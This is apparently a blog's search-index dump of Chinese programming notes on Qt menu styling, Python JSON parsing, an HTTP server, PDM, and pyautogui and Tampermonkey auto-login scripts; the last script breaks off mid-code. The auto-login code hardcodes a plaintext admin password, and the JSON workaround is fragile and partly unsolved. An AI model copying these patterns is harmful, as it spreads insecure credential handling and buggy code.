QCommonStyle(), size_(size) &#123;&#125;protected: int QCustonIconStyle::pixelMetric(PixelMetric metric, const QStyleOption* option, const QWidget* widget) const override &#123; if (metric == QStyle::PM_SmallIconSize) &#123; return size_; &#125;#if 1 // 一下内容是我尝试修改UI的，改了size之后会导致icon移位，需要修改间距和边距 else if (metric == QStyle::PM_LayoutLeftMargin) &#123; return 1; &#125; else if (metric == QStyle::PM_MenuHMargin) &#123; return 1; &#125; else if (metric == QStyle::PM_LayoutHorizontalSpacing) &#123; return 1; &#125;#endif return QCommonStyle::pixelMetric(metric, option, widget); &#125;private: int size_;&#125;; 使用方法： 12QCustonIconStyle* style = new QCustonIconStyle(20);QMenu-&gt;setStyle(style); 遗留问题，使用该方法之后，QAction的 horverd() 信号就不会触发了 关于这个问题的解决方法也很简单，尝试了一天，最终选择继承重写 QProxyStyle 就能解决这个问题。 2 使用 QWidgetAction1234action_ = new QPushButton(menu);QWidgetAction* action = new QWidgetAction(this);action-&gt;setDefaultWidget(action_ );menu-&gt;addAction(action); 3 新建界面","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Qt","slug":"B-Code/Qt","permalink":"http://example.com/categories/B-Code/Qt/"}]},{"title":"","date":"2023-10-27T01:24:02.222Z","path":"B_Code/Python/python解析Json/","text":"解析Json的常见代码1import json # 导入json解析需要的包 1. json.loads()读取字符串到json objectjson.loads()是将str\\bytes\\bytearray等格式的文件读取到json object中。但是在使用的时候往往会因为一些小问题导致读取错误等。 1234567891011121314151617181920212223242526272829303132Docstring:Deserialize ``s`` (a ``str``, ``bytes`` or ``bytearray`` instancecontaining a JSON document) to a Python object.``object_hook`` is an optional function that will be called with theresult of any object literal decode (a ``dict``). The return value of``object_hook`` will be used instead of the ``dict``. This featurecan be used to implement custom decoders (e.g. JSON-RPC class hinting).``object_pairs_hook`` is an optional function that will be called with theresult of any object literal decoded with an ordered list of pairs. Thereturn value of ``object_pairs_hook`` will be used instead of the ``dict``.This feature can be used to implement custom decoders. If ``object_hook``is also defined, the ``object_pairs_hook`` takes priority.``parse_float``, if specified, will be called with the stringof every JSON float to be decoded. By default this is equivalent tofloat(num_str). This can be used to use another datatype or parserfor JSON floats (e.g. decimal.Decimal).``parse_int``, if specified, will be called with the stringof every JSON int to be decoded. By default this is equivalent toint(num_str). This can be used to use another datatype or parserfor JSON integers (e.g. float).``parse_constant``, if specified, will be called with one of thefollowing strings: -Infinity, Infinity, NaN.This can be used to raise an exception if invalid JSON numbersare encountered.To use a custom ``JSONDecoder`` subclass, specify it with the ``cls``kwarg; otherwise ``JSONDecoder`` is used. data.json文件链接 链接：https://pan.baidu.com/s/1omzU65YMpJr0jPPFItZ7SA提取码：ysly复制这段内容后打开百度网盘手机App，操作更方便哦 上述文件相对常见的Json文件来说，还是有点区别的，用python的json库操作相对有点困难。 报错Expection \\，delimiter，看了好些解决办法仍然没能成功解决： 1234# 输入文件&#123;&#x27;asin&#x27;: &#x27;0000032069&#x27;, &#x27;title&#x27;: &#x27;Adult Ballet Tutu Cheetah Pink&#x27;, &#x27;price&#x27;: 7.89, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/51EzU6quNML._SX342_.jpg&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;0000032034&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00EXVN9PU&#x27;, &#x27;B0041EOTJO&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B001GTKPDQ&#x27;, &#x27;B00EON0SJ2&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002XZMGGQ&#x27;], &#x27;also_viewed&#x27;: [&#x27;B00D0F450I&#x27;, &#x27;0000032050&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;0000032042&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B0071KR2LC&#x27;, &#x27;B00GOR07RE&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B0079MCIMU&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00H3RYN3I&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B007IEFT84&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B007R2RM8W&#x27;, &#x27;B007VM3AMK&#x27;, &#x27;B00C0PLENA&#x27;, &#x27;B00BJGG6VG&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00IIK61WA&#x27;, &#x27;B009UC638W&#x27;, &#x27;B00KZN6RVI&#x27;, &#x27;B00CSFEENY&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00HSOJJ94&#x27;, &#x27;B00LIPP4VG&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B00E87F196&#x27;, &#x27;B005HMHOQY&#x27;, &#x27;B00J6S9MSS&#x27;, &#x27;0000032034&#x27;, &#x27;B00CJQGNJK&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B0056LG7GY&#x27;, &#x27;B00DPQWCZ2&#x27;, &#x27;B00I3PV0US&#x27;, &#x27;B00KZN6IVW&#x27;, &#x27;B0054TBWKO&#x27;, &#x27;B00I2S01I8&#x27;, &#x27;B00BXF12P8&#x27;, &#x27;B00GVHU678&#x27;, &#x27;B005NWENGC&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B00JK8MQ4Q&#x27;, &#x27;B00FZIMVQS&#x27;, &#x27;B008BB19VE&#x27;, &#x27;B00GTEXPOE&#x27;, &#x27;B009WPT2RQ&#x27;, &#x27;B00E37SBBG&#x27;], &#x27;bought_together&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;]&#125;, &#x27;brand&#x27;: &#x27;BubuBibi&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]&#125;&#123;&#x27;asin&#x27;: &#x27;0000031909&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;0000031895&#x27;, &#x27;B00D2K1M3O&#x27;, &#x27;0000031852&#x27;, &#x27;B00D0WDS9A&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D103F8U&#x27;, &#x27;B003AVEU6G&#x27;, &#x27;B00D2K0PA0&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00D0ZF44Y&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00D0GCI8S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B002YSCPZY&#x27;, &#x27;0448408775&#x27;, &#x27;B002R0FABA&#x27;, &#x27;B008GHWNWC&#x27;, &#x27;B002R0FA24&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B006XA7KZO&#x27;, &#x27;B001GZUQ9S&#x27;, &#x27;B00613VNL0&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B003LTOZK8&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B008UBQZKU&#x27;, &#x27;B001AQD8VQ&#x27;, &#x27;B003ILA0L2&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002R0F7FE&#x27;], &#x27;also_viewed&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00CEUWY8K&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B00HSOJB9M&#x27;, &#x27;0000031895&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00362QGW0&#x27;, &#x27;B008UD01L2&#x27;, &#x27;B00FAZ5ZE6&#x27;, &#x27;B008F0SY6O&#x27;, &#x27;B00DPLLQR2&#x27;, &#x27;B00CEUWUZC&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B00CEUX0D8&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D23MC6W&#x27;, &#x27;B007XAI53E&#x27;, &#x27;B008X6CBS2&#x27;, &#x27;B004PEI45U&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002C3Y6WG&#x27;, &#x27;B00HSC8O74&#x27;, &#x27;B008BMGHM4&#x27;, &#x27;B00CEUWTFS&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B00CYBU84G&#x27;, &#x27;B00D9C32NI&#x27;, &#x27;B0046W9T8C&#x27;, &#x27;B008UBG5IW&#x27;, &#x27;B001YHX45G&#x27;, &#x27;B00CEV8366&#x27;, &#x27;B00I2UHSZA&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B004TU1VPU&#x27;, &#x27;B00CBPIO7S&#x27;, &#x27;B00CHHXJ0M&#x27;, &#x27;B00538F5OK&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B00CEUX4QQ&#x27;, &#x27;B003XRKA7A&#x27;, &#x27;0000031852&#x27;, &#x27;B002C3R5XI&#x27;, &#x27;B00C6Q1Z6E&#x27;], &#x27;bought_together&#x27;: [&#x27;B002BZX8Z6&#x27;]&#125;, &#x27;title&#x27;: &#x27;Girls Ballet Tutu Neon Pink&#x27;, &#x27;price&#x27;: 7.0, &#x27;salesRank&#x27;: &#123;&#x27;Toys &amp; Games&#x27;: 201847&#125;, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/41xBoP0FVzL._SY300_.jpg&#x27;, &#x27;brand&#x27;: &#x27;Unknown&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;]], &#x27;description&#x27;: &#x27;High quality 3 layer ballet tutu. 12 inches in length&#x27;&#125; 1234567891011121314151617181920212223242526# 常见的Json读取JsonText = open(&#x27;data.json&#x27;,encoding=&#x27;utf-8&#x27;) # 打开data.jsonJson = JsonText.readlines() # 把json中的文件全部读取到Json对象中。# 读取上述data.json为json对象的代码list_data = list()def read_Json_file(i,x): # 返回有效的Json字段 print(&quot;第&quot; + i + &quot;行:&quot;) print(x) # 关于expectint的报错，我这处理就是但凡报错，直接返回空字段，如果你有别的解决办法，一定指教一下，不胜感激 try: JsonStr = x.replace(&quot;&#x27;&quot;, &#x27;&quot;&#x27;).replace(&#x27;/ &#x27;, &#x27;/&#x27;).replace(&#x27;, &#x27;,&#x27;,&#x27;) ret = json.loads(JsonStr,strict=False) except json.JSONDecodeError: return &#x27; &#x27; if(&#x27;categories&#x27; in ret): print(ret[&#x27;categories&#x27;]) return ret[&#x27;categories&#x27;] else: return &#x27; &#x27; list_data = list()for i in range(0,len(Json)): list_data.append(read_Json_file(str(i+1),Json[i])) 程序输出12345678第1行:&#123;&#x27;asin&#x27;: &#x27;0000032069&#x27;, &#x27;title&#x27;: &#x27;Adult Ballet Tutu Cheetah Pink&#x27;, &#x27;price&#x27;: 7.89, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/51EzU6quNML._SX342_.jpg&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;0000032034&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00EXVN9PU&#x27;, &#x27;B0041EOTJO&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B001GTKPDQ&#x27;, &#x27;B00EON0SJ2&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002XZMGGQ&#x27;], &#x27;also_viewed&#x27;: [&#x27;B00D0F450I&#x27;, &#x27;0000032050&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;0000032042&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B0071KR2LC&#x27;, &#x27;B00GOR07RE&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B0079MCIMU&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00H3RYN3I&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B007IEFT84&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B007R2RM8W&#x27;, &#x27;B007VM3AMK&#x27;, &#x27;B00C0PLENA&#x27;, &#x27;B00BJGG6VG&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00IIK61WA&#x27;, &#x27;B009UC638W&#x27;, &#x27;B00KZN6RVI&#x27;, &#x27;B00CSFEENY&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00HSOJJ94&#x27;, &#x27;B00LIPP4VG&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B00E87F196&#x27;, &#x27;B005HMHOQY&#x27;, &#x27;B00J6S9MSS&#x27;, &#x27;0000032034&#x27;, &#x27;B00CJQGNJK&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B0056LG7GY&#x27;, &#x27;B00DPQWCZ2&#x27;, &#x27;B00I3PV0US&#x27;, &#x27;B00KZN6IVW&#x27;, &#x27;B0054TBWKO&#x27;, &#x27;B00I2S01I8&#x27;, &#x27;B00BXF12P8&#x27;, &#x27;B00GVHU678&#x27;, &#x27;B005NWENGC&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B00JK8MQ4Q&#x27;, &#x27;B00FZIMVQS&#x27;, &#x27;B008BB19VE&#x27;, &#x27;B00GTEXPOE&#x27;, &#x27;B009WPT2RQ&#x27;, &#x27;B00E37SBBG&#x27;], &#x27;bought_together&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;]&#125;, &#x27;brand&#x27;: &#x27;BubuBibi&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]&#125;[[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]第2行:&#123;&#x27;asin&#x27;: &#x27;0000031909&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;0000031895&#x27;, &#x27;B00D2K1M3O&#x27;, &#x27;0000031852&#x27;, &#x27;B00D0WDS9A&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D103F8U&#x27;, &#x27;B003AVEU6G&#x27;, &#x27;B00D2K0PA0&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00D0ZF44Y&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00D0GCI8S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B002YSCPZY&#x27;, &#x27;0448408775&#x27;, &#x27;B002R0FABA&#x27;, &#x27;B008GHWNWC&#x27;, &#x27;B002R0FA24&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B006XA7KZO&#x27;, &#x27;B001GZUQ9S&#x27;, &#x27;B00613VNL0&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B003LTOZK8&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B008UBQZKU&#x27;, &#x27;B001AQD8VQ&#x27;, &#x27;B003ILA0L2&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002R0F7FE&#x27;], &#x27;also_viewed&#x27;: [&#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00AFDOPDA&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00CEUWY8K&#x27;, &#x27;B003IEDM9Q&#x27;, &#x27;B00HSOJB9M&#x27;, &#x27;0000031895&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B008F0SMUC&#x27;, &#x27;B00362QGW0&#x27;, &#x27;B008UD01L2&#x27;, &#x27;B00FAZ5ZE6&#x27;, &#x27;B008F0SY6O&#x27;, &#x27;B00DPLLQR2&#x27;, &#x27;B00CEUWUZC&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B00CEUX0D8&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D10CLVW&#x27;, &#x27;B00D23MC6W&#x27;, &#x27;B007XAI53E&#x27;, &#x27;B008X6CBS2&#x27;, &#x27;B004PEI45U&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002C3Y6WG&#x27;, &#x27;B00HSC8O74&#x27;, &#x27;B008BMGHM4&#x27;, &#x27;B00CEUWTFS&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B00CYBU84G&#x27;, &#x27;B00D9C32NI&#x27;, &#x27;B0046W9T8C&#x27;, &#x27;B008UBG5IW&#x27;, &#x27;B001YHX45G&#x27;, &#x27;B00CEV8366&#x27;, &#x27;B00I2UHSZA&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B001GTKPEK&#x27;, &#x27;B004TU1VPU&#x27;, &#x27;B00CBPIO7S&#x27;, &#x27;B00CHHXJ0M&#x27;, &#x27;B00538F5OK&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B00CEUX4QQ&#x27;, &#x27;B003XRKA7A&#x27;, &#x27;0000031852&#x27;, &#x27;B002C3R5XI&#x27;, &#x27;B00C6Q1Z6E&#x27;], &#x27;bought_together&#x27;: [&#x27;B002BZX8Z6&#x27;]&#125;, &#x27;title&#x27;: &#x27;Girls Ballet Tutu Neon Pink&#x27;, &#x27;price&#x27;: 7.0, &#x27;salesRank&#x27;: &#123;&#x27;Toys &amp; Games&#x27;: 201847&#125;, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/41xBoP0FVzL._SY300_.jpg&#x27;, &#x27;brand&#x27;: &#x27;Unknown&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;]], &#x27;description&#x27;: &#x27;High quality 3 layer ballet tutu. 12 inches in length&#x27;&#125;[[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;]] 打印了json中categories对象的值： [[‘Sports &amp; Outdoors’, ‘Other Sports’, ‘Dance’, ‘Clothing’, ‘Girls’, ‘Skirts’]], [[‘Sports &amp; Outdoors’, ‘Other Sports’, ‘Dance’]], [[‘Sports &amp; Outdoors’, ‘Other Sports’, ‘Dance’, ‘Clothing’, ‘Girls’, ‘Skirts’]] 2. 常见错误及解决办法 Expecting property name enclosed in double quotes: line 1 column 2 (char 1) Json文件的单双引号不对，如下所示Python中的一个str，Json中的Key值都是用单引号&#39;括起来的，就会报错Expecting property name enclosed in double quotes： 1&quot;&#123;&#x27;asin&#x27;: &#x27;0000032069&#x27;, &#x27;title&#x27;: &#x27;Adult Ballet Tutu Cheetah Pink&#x27;, &#x27;price&#x27;: 7.89, &#x27;imUrl&#x27;: &#x27;http://ecx.images-amazon.com/images/I/51EzU6quNML._SX342_.jpg&#x27;, &#x27;related&#x27;: &#123;&#x27;also_bought&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;0000032034&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00EXVN9PU&#x27;, &#x27;B0041EOTJO&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B001GTKPDQ&#x27;, &#x27;B00EON0SJ2&#x27;, &#x27;B005HMHOQ4&#x27;, &#x27;B002XZMGGQ&#x27;], &#x27;also_viewed&#x27;: [&#x27;B00D0F450I&#x27;, &#x27;0000032050&#x27;, &#x27;B00D2JTMS2&#x27;, &#x27;0000032042&#x27;, &#x27;B004PYEE8G&#x27;, &#x27;B00JHNSNSM&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;B00D2JSRFQ&#x27;, &#x27;B00D0FCQQI&#x27;, &#x27;B00D2JRWWA&#x27;, &#x27;B003AVNY6I&#x27;, &#x27;B0071KR2LC&#x27;, &#x27;B00GOR07RE&#x27;, &#x27;B00D0FIIJM&#x27;, &#x27;B005F50FXC&#x27;, &#x27;B0079MCIMU&#x27;, &#x27;B00D0FDUAY&#x27;, &#x27;B00H3RYN3I&#x27;, &#x27;B005C4Y4F6&#x27;, &#x27;B007IEFT84&#x27;, &#x27;B00D0D5F6S&#x27;, &#x27;B002BZX8Z6&#x27;, &#x27;B00JHONN1S&#x27;, &#x27;B008F0SU0Y&#x27;, &#x27;B00FNNFXAG&#x27;, &#x27;B007R2RM8W&#x27;, &#x27;B007VM3AMK&#x27;, &#x27;B00C0PLENA&#x27;, &#x27;B00BJGG6VG&#x27;, &#x27;B00E1YRI4C&#x27;, &#x27;B00IIK61WA&#x27;, &#x27;B009UC638W&#x27;, &#x27;B00KZN6RVI&#x27;, &#x27;B00CSFEENY&#x27;, &#x27;B002GZGI4E&#x27;, &#x27;B00HSOJJ94&#x27;, &#x27;B00LIPP4VG&#x27;, &#x27;B009RXWNSI&#x27;, &#x27;B00E87F196&#x27;, &#x27;B005HMHOQY&#x27;, &#x27;B00J6S9MSS&#x27;, &#x27;0000032034&#x27;, &#x27;B00CJQGNJK&#x27;, &#x27;B008FCA0F0&#x27;, &#x27;B0056LG7GY&#x27;, &#x27;B00DPQWCZ2&#x27;, &#x27;B00I3PV0US&#x27;, &#x27;B00KZN6IVW&#x27;, &#x27;B0054TBWKO&#x27;, &#x27;B00I2S01I8&#x27;, &#x27;B00BXF12P8&#x27;, &#x27;B00GVHU678&#x27;, &#x27;B005NWENGC&#x27;, &#x27;B003AVKOP2&#x27;, &#x27;B00JK8MQ4Q&#x27;, &#x27;B00FZIMVQS&#x27;, &#x27;B008BB19VE&#x27;, &#x27;B00GTEXPOE&#x27;, &#x27;B009WPT2RQ&#x27;, &#x27;B00E37SBBG&#x27;], &#x27;bought_together&#x27;: [&#x27;0000032050&#x27;, &#x27;B00D0DJAEG&#x27;, &#x27;0000032042&#x27;, &#x27;B00D0F450I&#x27;]&#125;, &#x27;brand&#x27;: &#x27;BubuBibi&#x27;, &#x27;categories&#x27;: [[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]]&#125;&quot; 替换掉str中的&#39;为&quot;，替换/_（空格）为/: 1text.replace(&quot;&#x27;&quot;, &#x27;&quot;&#x27;).replace(&#x27;/ &#x27;, &#x27;/&#x27;) 再接着读取就不会报错了！！！ 1JsonValue[&#x27;categories&#x27;] 结果： 1[[&#x27;Sports &amp; Outdoors&#x27;, &#x27;Other Sports&#x27;, &#x27;Dance&#x27;, &#x27;Clothing&#x27;, &#x27;Girls&#x27;, &#x27;Skirts&#x27;]] expecting , delimiter 这个问题真的被搞得头疼，到目前还没解决，Json字段是没有问题的，但是loads()函数就是会报错 解决办法","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"http://example.com/categories/B-Code/Python/"}]},{"title":"python 开启http服务","date":"2023-10-27T01:24:02.221Z","path":"B_Code/Python/python开启http服务/","text":"概述：使用python开启http服务 [toc] python 开启 http 服务在需要开启http服务的文件件运行一下命令即可： 123python -m SimpleHTTPServer 8080# 或者python -m http.server 8080","tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"http","slug":"http","permalink":"http://example.com/tags/http/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"http://example.com/categories/B-Code/Python/"}]},{"title":"pdm用法整理","date":"2023-10-27T01:24:02.220Z","path":"B_Code/Python/pdm用法/","text":"来了！划时代的 Python 包管理工具 – PDM - 知乎 初始化 PDM ：1pdm init 查看帮助1pdm -h 切换python环境当你在初始化 pdm 项目时，就已经选定了当前的 Python 版本和可用的 Python 版本范围，后面如果想更改，可以使用 use 命令，但版本要受之前设定的版本范围约束。 假设允许范围是 python 3.9+，当前使用的是 python 3.10，可以直接切换过去。 1pdm use python3.9","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"Python","slug":"B-Code/Python","permalink":"http://example.com/categories/B-Code/Python/"}]},{"title":"Python 界面实现 Gui 界面自动输入","date":"2023-10-27T01:24:02.218Z","path":"B_Code/Python/gui界面自动输入/","text":"开发过程中使用后台时，每次都需要输入用户名和密码，很麻烦，尝试解决这个麻烦的过程中使用了 pyautogui 这个库，整理记录一下，实际登录web网站时，自动输入还有别的方法，可以使用油猴脚本实现，详见文末使用油猴自动登录网站。 [toc] 使用 python 实现 Gui 自动登录需求界面主动输入 admin 后跳转到密码栏再自动输入 Admin@2022 思路主要是使用 pyautogui 库， pyautogui封装了界面的相关操作，包括鼠标和键盘事件。 源码 pyautogui.typewrite 可以模拟输入字符的输入 pyautogui.press 可以模拟其他操作类型的键的输入 基于以上两点，我们只需要构建一个输入的队列，然后遍历队列执行响应的操作即可 构建输入队列队列的键值的键值如下所示，先输入需要录入的单词，紧接着执行对应的操作即可： 1234567891011# &#123;pyautogui.typewrite， pyautogui.press&#125;tac = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125;wiki = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125; 遍历输入队列1234for key in tac: print(key, &quot;:&quot;, tac[key]) pyautogui.typewrite(key, interval=interval) pyautogui.press(tac[key], interval=interval) 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445&quot;&quot;&quot;python -m PyInstaller -F -w -n auto_input ./auto_input.py&quot;&quot;&quot;import pathlibimport pyautogui# 控制速度interval = 0.05tac = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125;wiki = &#123; &#x27;admin&#x27;:&#x27;tab&#x27;, &#x27;Admin@2022&#x27;:&#x27;enter&#x27;&#125;text_alert = &quot;&quot;&quot;开始前请确保完成以下操作 1. 请切换为英文输入法 2. 请打开输入界面 3. 将光标放至开始输入的位置 4. 选择要输入的代码&quot;&quot;&quot;def main(): global codes option = pyautogui.confirm(text=text_alert, title=&#x27;自动输入小工具&#x27;, buttons=[&#x27;tac&#x27;,&#x27;wiki&#x27;]) if option == &#x27;tac&#x27;: for key in tac: print(key, &quot;:&quot;, tac[key]) pyautogui.typewrite(key, interval=interval) pyautogui.press(tac[key], interval=interval) elif option == &#x27;wiki&#x27;: for key in tac: print(key, &quot;:&quot;, wiki[key]) pyautogui.typewrite(key, interval=interval) pyautogui.press(wiki[key], interval=interval)if __name__ == &#x27;__main__&#x27;: main() web网站使用油猴脚本实现自动登录123456789101112131415161718192021222324252627282930313233343536373839// ==UserScript==// @name 零信任TAC一键登录// @namespace http://tampermonkey.net/// @version 0.1// @description try to take over the world!// @author BladeHiker// @match https://*/admin/*// @match https://*/tap/admin/*// @icon https://www.google.com/s2/favicons?sz=64&amp;domain=57.171// @grant none// ==/UserScript==(function() &#123; &#x27;use strict&#x27;; window.onload = () =&gt; &#123; setInterval(()=&gt;&#123; if(window.location.pathname==&#x27;/admin/login&#x27;)&#123; setTimeout(()=&gt;&#123; 